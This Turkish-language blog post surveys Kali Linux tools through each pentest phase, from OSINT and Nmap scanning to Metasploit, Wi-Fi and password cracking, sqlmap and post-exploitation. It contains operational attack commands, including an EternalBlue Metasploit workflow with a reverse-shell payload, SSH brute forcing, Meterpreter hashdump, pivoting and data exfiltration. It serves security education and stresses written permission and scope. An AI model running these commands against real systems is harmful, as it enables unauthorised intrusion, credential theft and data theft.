---
originalSlug: "kali-linux-arsenal"
lang: "tr"
title: "Kali Linux Cephaneliği: Pentest Araç Çantanızdaki Her Silah İçin Kapsamlı Bir Kılavuz"
published: 2026-01-27
description: "Keşif, zafiyet değerlendirmesi, istismar ve istismar sonrası süreçler için endüstri standardı araçlara derinlemesine bir bakış."
image: ""
tags: ["Cybersecurity", "Pentesting", "Kali Linux", "Infosec"]
category: "Cybersecurity"
draft: false
---

Kali Linux, 600'den fazla önceden yüklenmiş aracıyla sızma testleri (pentest) için altın standarttır. İşletim sisteminin sunduğu çeşitlilik etkileyici olsa da, asıl gücü bu araçların sızma testi yaşam döngüsünün çeşitli aşamalarında metodik olarak uygulanmasında yatar. Bu kılavuz, Kali Linux içerisinde yerleşik olan "Sınıfının En İyisi" araçları incelemekte; pratik kullanım senaryoları, gelişmiş komut satırı teknikleri ve modern güvenlik değerlendirmeleri için stratejiler sunmaktadır.

İster bir red team üyesi, ister bir bug hunter, isterse aday bir güvenlik uzmanı olun; bu araçlarda uzmanlaşmak, ağ protokolleri, işletim sistemi iç işleyişi ve bir saldırganın zihniyeti hakkında derin bir anlayış gerektirir. Bu sadece bir liste değil; karmaşık bir güvenlik testi iş akışı oluşturmak için bir el kitabıdır.

---

## Bilgi Toplama ve Pasif Keşif

Her başarılı çalışma keşif ile başlar. Buradaki amaç, hedefin altyapısıyla doğrudan etkileşime girmeden veya bunu gürültüyü en aza indirecek şekilde yaparak, hedef hakkında devasa bir dijital ayak izi oluşturmaktır.

## Recon-ng ve theHarvester ile Pasif Keşif

Başlangıç noktası genellikle OSINT'tir (Açık Kaynak İstihbaratı). `theHarvester` veya `Recon-ng` gibi araçlar bunun için üretilmiştir.

### Ustalık Sınıfı: theHarvester Kullanımı

`theHarvester`, Google, Bing, LinkedIn ve Shodan veritabanı gibi yüksek trafikli kaynaklardan e-posta, alt alan adı, isim, açık port ve banner bilgileri toplayan bir OSINT aracıdır.

- **Komut Sözdizimi**: `theHarvester -d target-domain.com -l 500 -b google,linkedin,shodan`
- **İpucu**: Shodan ve Censys için API anahtarlarınızı `api-keys.yaml` yapılandırma dosyasına entegre etmek, sonuçların doğruluğunu önemli ölçüde artırır.

### Derinlemesine Bakış: Recon-ng Framework

`Recon-ng`, Metasploit'e benzeyen bir CLI arayüzüne sahip, tam özellikli bir keşif çerçevesidir. Yüzlerce farklı API'den veri çekmek için modüler bir sistem kullanır.

1. **Çalışma Alanı Yönetimi**: Projeniz için her zaman bir çalışma alanı oluşturun: `workspaces create target_corp`.
2. **Modül Kurulumu**: İhtiyacınız olan modülleri bulmak için `marketplace search` ve `marketplace install` komutlarını kullanın (örneğin: `bing_domain_web`).
3. **Çalıştırma**: `modules load info/domains-contacts/bing_domain_web` komutunu ve ardından `run` komutunu çalıştırın.

---

## Zafiyet Analizi ve Aktif Tarama

Hedeflerinizi belirledikten sonra bir sonraki adım aktif keşiftir. Bu, açık portları, çalışan servisleri ve potansiyel zafiyetleri belirlemek için hedef ağ ile etkileşime girmeyi içerir.

## Nmap: Ağ Taramasının İsviçre Çakısı

Nmap, basit port taramasının çok ötesine geçer. Asıl gücü Nmap Scripting Engine (NSE) özelliğinde yatar.

### Gelişmiş Tarama Teknikleri

- **Gizli Tarama**: Yarı açık TCP SYN taraması için `-sS` kullanın. Bu, tam TCP bağlantı taramasından daha hızlıdır ve loglanma olasılığı daha düşüktür.
- **Servis Sürüm Tespiti**: Açık portları sorgulamak ve hangi servisin ve sürümün çalıştığını belirlemek için `-sV` kullanın.
- **OS Parmak İzi Alma**: Hedefin belirli ağ paketlerine verdiği yanıtlara göre işletim sistemini tahmin etmek için `-O` kullanın.
- **Agresif Tarama**: `-A` seçeneği; OS tespiti, sürüm tespiti, script taraması ve traceroute işlemlerini birleştirir.

### NSE Scriptlerinin Gücü

Nmap Scripting Engine, çok çeşitli görevleri otomatize etmenize olanak tanır.

- **Zafiyet Kontrolleri**: `nmap -p 80 --script http-vulnerabilities-check target.com`
- **Kaba Kuvvet (Brute Force)**: `nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt target-ip`

## Zafiyet Tarayıcıları: OpenVAS ve Nessus

Nmap keşif için harika olsa da, OpenVAS (Kali'de artık GVM) veya Nessus (ayrı lisans gerektirir) gibi özel bir zafiyet tarayıcısı; eksik yamalar ve yapılandırma hataları dahil olmak üzere zayıflıkların çok daha kapsamlı bir analizini sağlar.

---

## İstismar (Exploitation) Çerçeveleri

Saldırının gerçekte gerçekleştiği yer burasıdır. İstismar araçları, önceki aşamalarda keşfedilen zafiyetlerden faydalanmak için kullanılır.

## Metasploit: Cephaneliğin Çekirdeği

Metasploit Framework (MSF), dünyanın en çok kullanılan sızma testi platformudur. Devasa bir exploit ve payload veritabanı sağlar.

### Metasploit İş Akışı

1. **Arama**: Hedefiniz için bir exploit bulun: `search platform:windows type:exploit smb`.
2. **Yapılandırma**: Exploit'i kullanın: `use exploit/windows/smb/ms17_010_eternalblue`.
3. **Seçenekleri Ayarlama**: Hedef IP'yi (`set RHOSTS 192.168.1.50`) ve reverse shell için yerel makinenizin IP'sini (`set LHOST 192.168.1.100`) yapılandırın.
4. **Payload Seçimi**: `windows/x64/meterpreter/reverse_tcp` gibi bir payload seçin.
5. **İstismar**: `exploit` yazın ve oturumun açılmasını bekleyin.

### Meterpreter Neden Önemlidir?

Meterpreter, bellek içi DLL enjeksiyonu kullanan gelişmiş, dinamik olarak genişletilebilir bir payload'dur. Tamamen hedefin belleğinde yaşadığı için adli bilişim araçlarının tespit etmesi zordur. Dosya sistemi navigasyonuna, keylogger kullanımına, ekran görüntüsü almaya ve ağdaki diğer makinelere sıçrama (pivot) yapmaya olanak tanır.

---

## Kablosuz Ağ ve Parola Saldırıları

Kali Linux, kablosuz ağlar ve şifreli sistemler gibi özel ortamlarda üstündür.

## Aircrack-ng Paketi: Wi-Fi Kırma

`aircrack-ng` paketi, kablosuz ağ güvenliğini denetlemek için endüstri standardıdır.

- **Airmon-ng**: Kablosuz kartınızı monitör moduna geçirir.
- **Airodump-ng**: Analiz için havadan paket yakalar.
- **Aireplay-ng**: Bir WPA2 el sıkışmasını (handshake) yakalamanızı sağlamak için deauthentication (bağlantı kesme) saldırısı yaparak paket enjekte eder.
- **Aircrack-ng**: Yakalanan el sıkışmasını kırmak için bir sözlük dosyası (wordlist) kullanır.

## Parola Kırma: John the Ripper vs. Hashcat

Elinizde bir hash (örneğin bir veritabanından veya Linux `/etc/shadow` dosyasından) varsa, onu kırmanız gerekir.

- **John the Ripper**: CPU tabanlı kırmada mükemmel olan ve inanılmaz bir kural motoruna sahip, çok platformlu güçlü bir parola kırıcıdır.
- **Hashcat**: Özellikle GPU'ların (Grafik İşlem Birimleri) gücünden yararlanmak için tasarlanmış, dünyanın en hızlı parola kırıcıdır. Güçlü bir NVIDIA veya AMD kartınız varsa, Hashcat saniyede milyarlarca parolayı test edebilir.

---

## Web Uygulama Güvenliği

Web uygulamaları genellikle bir kurumun güvenlik duruşundaki en zayıf halkadır.

## Burp Suite: Web Mimarının Kabusu

Burp Suite (Kali'de Community sürümü bulunur), web uygulamalarının güvenlik testlerini gerçekleştirmek için entegre bir platformdur.

- **Proxy**: Tarayıcınız ve sunucu arasındaki HTTP/S isteklerini yakalayın ve değiştirin.
- **Repeater**: Sunucunun nasıl yanıt verdiğini görmek için değiştirilmiş istekleri manuel olarak yeniden gönderin.
- **Intruder**: Web uygulamalarına karşı özelleştirilmiş saldırıları otomatize edin (Community sürümünde hız sınırlıdır).
- **Decoder**: URL, Base64 ve Hex gibi veri formatlarını kodlayın veya çözün.

## SQLmap: Veritabanı İstismarını Otomatize Etme

`sqlmap`, SQL injection açıklarını tespit etme ve istismar etme sürecini otomatize eden açık kaynaklı bir araçtır.

- **Temel Komut**: `sqlmap -u "http://target.com/page.php?id=1" --dbs` (Bu, sunucudaki veritabanlarını tanımlar).
- **Otomatik İşleme**: Oturum çerezlerinden MySQL, PostgreSQL ve Oracle gibi özel veritabanı altyapılarına kadar her şeyi otomatik olarak ele alır.

---

## İstismar Sonrası ve Gizli Kalma

Bir kez erişim sağladığınızda, amaç erişiminizi genişletmek ve kalıcılığı korumaktır.

## Meterpreter'da İstismar Sonrası Komutlar

Bir oturum elde ettiğinizde işiniz yeni başlıyor demektir:

- `getuid`: Şu anda hangi kullanıcı olarak işlem yaptığınızı görün.
- `sysinfo`: Hedef işletim sistemi hakkında ayrıntılı bilgi alın.
- `hashdump`: SAM veritabanını veya parola hash'lerini dökün.
- `upload/download`: Kendi makineniz ile hedef arasında dosya taşıyın.
- `shell`: Hedef üzerinde yerel bir komut satırına geçiş yapın.

## Pivoting: Ağ İçinde İlerlemek

İstismar ettiğiniz makine çift ağa sahipse (iki ağa bağlıysa), internetten ulaşılamayan bir iç ağdaki makinelere saldırmak için onu bir atlama noktası (pivot) olarak kullanabilirsiniz. Metasploit'in `autoroute` ve `SOCKS proxy` modülleri bunun için hayati önem taşır.

---

## Temel Kali Bakımı ve Özelleştirme

Etkili olmak için Kali kurulumunuz güncel olmalı ve doğru yapılandırılmalıdır.

### Kali'yi Güncel Tutmak

Her zaman çalıştırın:
`sudo apt update && sudo apt full-upgrade -y`
Bu, en son araç sürümlerine ve güvenlik yamalarına sahip olduğunuzdan emin olmanızı sağlar.

### Performans İçin Optimizasyon

- **Özel Kernel'lar**: Gelişmiş kablosuz ağ saldırıları için özel başlıklar yüklemeniz gerekebilir.
- **GPU Sürücüleri**: Eğer Hashcat kullanıyorsanız, GPU'nuzun gücünden yararlanmak için doğru özel sürücülerin yüklü olduğundan emin olun.

---

## Gelişmiş Örnek Olay: Standart Bir İç Ağ Pentest İş Akışı

Bu araçların birlikte nasıl çalıştığını göstermek için, bir iç ağ değerlendirmesi için tipik bir iş akışı şöyledir:

1. **Ağ Keşfi**: Aktif hostları bulmak için `netdiscover` veya `nmap -sn` kullanın.
2. **Servis Haritalama**: Tüm açık portları bulmak için keşfedilen hostlar üzerinde `nmap -sV -p-` çalıştırın.
3. **Zafiyet Taraması**: Belirlenen servisleri taramak için `OpenVAS/GVM` kullanın.
4. **İstismar**: Zafiyetli bir servis bulun (örneğin yaması yapılmamış bir SMB servisi) ve shell elde etmek için Metasploit kullanın.
5. **İstismar Sonrası**: Parola hash'lerini almak için `hashdump` kullanın ve bunları kırmak için `John the Ripper` ile çalışın.
6. **Pivoting**: Diğer makinelere giriş yapmak için kırılan kimlik bilgilerini kullanın veya ağın diğer segmentlerine atlamak için ilk makineyi pivot noktası olarak kullanın.
7. **Veri Sızdırma**: Hassas verileri tanımlayın ve raporunuz için bunları güvenli bir şekilde "sızdırın".

---

## Derinlemesine Bakış: Kali Araçlarının OSI Katman Haritalaması

OSI modelinin hangi katmanıyla etkileşime girdiğinizi anlamak, profesyonel güvenlik analistleri için çok önemlidir.

- **Katman 2 (Veri Bağı)**: `macchanger` (MAC adresi sahteciliği), `ettercap` (ARP zehirleme), `aircrack-ng` (Wi-Fi çerçeveleri).
- **Katman 3 (Ağ)**: `nmap` (IP tarama ve yönlendirme), `hping3` (paket manipülasyonu), `fping`.
- **Katman 4 (Taşıma)**: `nmap` (TCP/UDP port tarama), `netcat` (ham bağlantılar oluşturma).
- **Katman 7 (Uygulama)**: `Burp Suite` (HTTP), `metasploit` (belirli yazılım hatalarını istismar etme), `sqlmap` (SQL).

---

### Etik Hususlar ve Son Düşünceler

Kali Linux'taki araçlar inanılmaz derecede güçlüdür. Bu güç, büyük bir sorumluluğu beraberinde getirir.

1. **İzin Alın**: Açık, yazılı izniniz olmayan hiçbir sistemi asla test etmeyin.
2. **Kapsam**: Her zaman üzerinde anlaşılan çalışma kapsamı içinde kalın.
3. **Dokümantasyon**: Yaptığınız her şeyin titiz notlarını tutun. Nihai raporunuz, çalışmanızın gerçek "ürünüdür".

Kali Linux, sadece bir araç koleksiyonundan fazlasıdır; sürekli öğrenme için bir platformdur. Bu kılavuzda bahsedilen her aracın derinliği muazzamdır ve herhangi birinde uzmanlaşmak yıllar alabilir. Küçük başlayın, laboratuvarınızı kurun ve düzenli olarak pratik yapın.

:::tip Gelişmiş İpucu
Kali'yi "Persistence" (Kalıcılık) ve "Encrypted persistence" (Şifreli kalıcılık) özellikleri ile yüksek hızlı bir USB 3.x sürücüden çalıştırmayı düşünün. Bu, tüm araç setinizi ve verilerinizi cebinizde güvenli bir şekilde taşımanıza ve her türlü görev için hazır olmanıza olanak tanır.
:::

---

## Ek: İleri Düzey Kullanıcılar İçin Temel CLI Kısayolları

- **Ctrl + R**: Komut geçmişinizde arama yapın. Uzun bir `nmap` komutunu hatırlayamadığınızda hayat kurtarır.
- **grep/awk/sed**: Güvenlik araçlarından gelen devasa çıktıları filtrelemek için bu "metin işleme" araçlarında ustalaşın.
- **TMUX**: `tmux` gibi bir terminal çoğullayıcı kullanın. Tek bir pencerede birden fazla terminal oturumuna sahip olmanızı sağlar ve daha da önemlisi, sunucu ile bağlantınız kesilse bile oturumlarınızın çalışmaya devam etmesini sağlar.

### Tavsiye Edilen Okumalar

- *Kali Linux Revealed*: İşletim sistemi için resmi dokümantasyon.
- *The Hacker Playbook* (Serisi): Bu araçların gerçek dünya senaryolarında kullanımı üzerine mükemmel pratik kılavuzlar.